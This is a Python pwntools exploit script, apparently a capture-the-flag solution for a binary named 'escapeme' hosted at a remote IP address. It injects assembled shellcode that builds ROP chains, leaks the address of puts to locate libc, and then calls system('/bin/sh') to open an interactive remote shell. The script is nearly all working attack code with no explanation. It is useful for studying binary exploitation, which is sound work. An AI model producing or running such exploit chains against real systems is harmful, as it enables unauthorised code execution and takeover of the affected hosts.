from pwn import *
import time
#p = process("./escapeme",env = {"LD_PRELOAD" : "./libc-2.31.so"})
#p = process("./escapeme")
#p = remote("localhost",4000)
p = remote("34.87.157.237",31338)

elf = ELF("./escapeme")
libc = ELF("./libc-2.31.so")
#rbp-0x28 out put
pop_rdi_ret = 0x0000000000401b13
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']

shellcode = asm("mov rax,qword ptr[rbp-0x28];mov dword ptr[rax],0x124;add rax,0x10c;mov rbx,%d;mov qword ptr[rax],rbx;add rax,8;mov rbx,%d;mov qword ptr[rax],rbx;add rax,8;mov rbx,%d;mov qword ptr[rax],rbx;add rax,8;mov rbx,%d;mov qword ptr[rax],rbx;mov rax,1;mov rdi,[rbp-8];mov rsi,qword ptr[rbp-0x28];mov rdx,0x12c;syscall;ret;" %(pop_rdi_ret,puts_got,puts_plt,main),arch='amd64')

size = len(shellcode)

print "[+] shellcode len : " + str(size)
print "[+] shellcode : "
print disasm(shellcode,arch='amd64')

#b*0x0401a42
#gdb.attach(p,"b*0x04019b5")
p.sendlineafter(">","1")
str_size = str(size)
p.sendlineafter("size:",str_size)
p.send(shellcode + '\n')

p.sendlineafter(">>","1")
p.sendlineafter("size:","1")
p.sendline("a")
#try more and more
p.recvuntil("crashed or exited.")

p.sendlineafter(">>","2")

puts = u64(p.recvuntil("\x7f").ljust(8,'\x00'))
libc_base = puts - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()
oneshot = libc_base + 0xe6e79 #rsi ,rdx null

pop_rsi_pop_r15_ret = 0x0000000000401b11
pop_rdx_pop_rbx_ret = libc_base + 0x0000000000162866

print "[+] leak puts : " + hex(puts)
print "[+] libc_base : " + hex(libc_base)
print "[+] system : " + hex(system)
print "[+] binsh : " + hex(binsh)
print "[+] oneshot : " + hex(oneshot)

#step 2 
shellcode = asm("mov rax,qword ptr[rbp-0x28];mov dword ptr[rax],0x150;add rax,0x10c;mov rbx,%d;mov qword ptr[rax],rbx;add rax,8;mov rbx,%d;mov qword ptr[rax],rbx;add rax,8;mov rbx,%d;mov qword ptr[rax],rbx;add rax,8;mov rbx,%d;mov qword ptr[rax],rbx;add rax,8;mov rbx,%d;mov qword ptr[rax],rbx;add rax,8;mov rbx,%d;mov qword ptr[rax],rbx;add rax,8;mov rbx,%d;mov qword ptr[rax],rbx;mov rax,1;mov rdi,[rbp-8];mov rsi,qword ptr[rbp-0x28];mov rdx,0x150;syscall;ret;" %(pop_rdi_ret,binsh,pop_rsi_pop_r15_ret,0,0,system,system),arch='amd64')
#shellcode = asm("mov rax,qword ptr[rbp-0x28];mov dword ptr[rax],0x150;add rax,0x10c;mov rbx,%d;mov qword ptr[rax],rbx;add rax,8;mov rbx,%d;mov qword ptr[rax],rbx;add rax,8;mov rbx,%d;mov qword ptr[rax],rbx;add rax,8;mov rbx,%d;mov qword ptr[rax],rbx;add rax,8;mov rbx,%d;mov qword ptr[rax],rbx;add rax,8;mov rbx,%d;mov qword ptr[rax],rbx;add rax,8;mov rbx,%d;mov qword ptr[rax],rbx;mov rax,1;mov rdi,[rbp-8];mov rsi,qword ptr[rbp-0x28];mov rdx,0x150	;syscall;ret;" %(pop_rsi_pop_r15_ret,0,0,pop_rdx_pop_rbx_ret,0,0,oneshot),arch='amd64')

size = len(shellcode)

print "[+] shellcode len : " + str(size)
print "[+] shellcode : "
print disasm(shellcode,arch='amd64')

p.sendlineafter(">","1")
str_size = str(size)
p.sendlineafter("size:",str_size)
p.send(shellcode + '\n')

p.sendlineafter(">>","1")
p.sendlineafter("size:","1")
p.sendline("a")
#try more and more
p.recvuntil("crashed or exited.")

p.sendlineafter(">>","2")

p.interactive()


